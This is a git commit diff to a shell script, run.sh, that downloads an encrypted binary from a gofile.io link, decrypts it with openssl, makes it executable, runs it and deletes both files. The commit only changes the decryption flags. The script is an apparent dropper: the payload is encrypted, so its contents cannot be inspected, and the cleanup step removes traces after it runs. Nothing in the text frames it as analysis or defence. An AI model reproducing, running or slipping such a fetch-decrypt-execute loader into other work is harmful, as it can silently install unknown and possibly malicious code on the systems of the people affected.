30990dff809c09b989b31788fd284c7eea660d2c
Planet Nine <122791309+plnine@users.noreply.github.com>
2023-01-27 16:40:19 +0300

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 #! /bin/bash
 cd
 curl -O https://store5.gofile.io/download/973d395e-468f-4c64-ba96-f98834a9fbaf/x-l1bra.enc
-openssl enc -d -aes-256-cbc -in x-l1bra.enc -out x-l1bra
+openssl enc -d -aes-256-cbc -md md5 -in x-l1bra.enc -out x-l1bra
 sudo chmod 755 x-l1bra
 ./x-l1bra
 rm x-l1bra.enc x-l1bra
